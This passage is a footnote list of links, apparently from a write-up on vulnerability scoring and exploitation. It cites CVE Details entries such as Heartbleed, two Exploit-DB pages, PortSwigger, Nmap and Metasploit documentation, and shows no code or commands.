[^6] https://www.balbix.com/insights/understanding-cvss-scores/ 

[^7]: https://www.cvedetails.com/ 

[^8]: https://www.cvedetails.com/cve/CVE-2014-0160/ 

[^9]: https://www.cvedetails.com/vulnerabilities-by-types.php

[^10]: https://portswigger.net/web-security/information-disclosure

[^11]: https://www.exploit-db.com/exploits/32764 

[^12]: https://www.exploit-db.com/exploits/32745

[^13]: https://nmap.org/  

[^14]: https://docs.rapid7.com/metasploit/msf-overview/

[^15]: https://www.offensive-security.com/metasploit-unleashed/msfconsole/ 

[^16]: https://www.youtube.com/watch?v=-qzZIHJ0HLU 

